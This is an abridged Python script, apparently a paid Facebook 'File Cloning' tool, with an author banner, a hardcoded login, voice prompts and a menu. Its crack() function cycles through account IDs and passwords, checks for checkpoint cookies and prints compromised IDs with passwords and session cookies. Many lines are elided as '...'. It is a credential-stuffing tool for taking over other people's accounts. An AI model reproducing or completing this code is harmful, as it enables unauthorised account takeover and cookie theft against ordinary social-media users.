#Mehmood ali
#Otha Ly kya yad kary ga kon sa mari ha 
import os 
...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mSmN')
...
while attemps < 12345677901:
    ...
    if username == 'SmN' and password == 'Ali':
...
os.system('espeak -a 300 " Your,   Beautiful,  Name,"')
NameX =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m:\33[1;32m')
os.system('espeak -a 300 " Welcome,   to,  Mehmood,  Ali,  King,  Tools"')
os.system('xdg-open https://www.facebook.com/100077496176471')
def banner():
	os.system("clear")
	print (f"""
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
.d8888. db   db  .d8b.  d888888b db   dD db   db 
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMR-MEHMOOD ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • M358 King ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mM358-King ]   ║\33[1;34m   
╠══[Whatsapp                 • +923000899758 ]  ║\33[1;35m 
╠══[TOOLS                    • Paid  ]        ║ \33[1;32m   
╠══[VERSION                  • 0.1 ]          ║\033[1;35m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
def login():
	banner()
	SMNj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	SMNj('\033[0;97m===============================================')
	SMN= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if SMN in ['m']:
		public()
	elif SMN in ['1']:
		crack_file()
...
def passwrd():
	...
	SMNj(f'\033[0;97m===============================================')
	os.system('espeak -a 300 " 1,  cloning,  Start"')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[Smn-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				SMN.KING
				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•SmN-Cp] {idf} • {pw}')     
			 ...
			 #   open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				...
				#SmN-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•Smn-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " .Smn,  Ok,  id"')
